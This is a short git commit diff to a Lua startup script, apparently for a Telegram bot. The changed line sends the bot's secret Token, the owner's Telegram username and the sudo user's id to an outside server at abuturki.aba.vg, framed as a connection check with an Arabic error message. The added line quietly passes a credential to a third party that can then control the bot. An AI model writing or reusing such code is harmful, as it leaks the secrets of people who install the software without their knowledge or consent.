ab35449914e872c505876a2fe376f080d479c517
T4rckyGamer <68791309+T4rckyGamer@users.noreply.github.com>
2021-08-16 12:44:48 +0300

    Update Run.lua

--- inc/Run.lua
+++ inc/Run.lua
@@ -65,7 +65,7 @@ local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ','
 user = {}
 user.username = SUDO_USER
 user.Source  = DirFol
-local url , res = https.request('http://abuturki.aba.vg/index.php?Array='..JSON.encode(user))
+local url , res = https.request('https://abuturki.aba.vg/index.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 print(res)
 if res ~= 200 then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
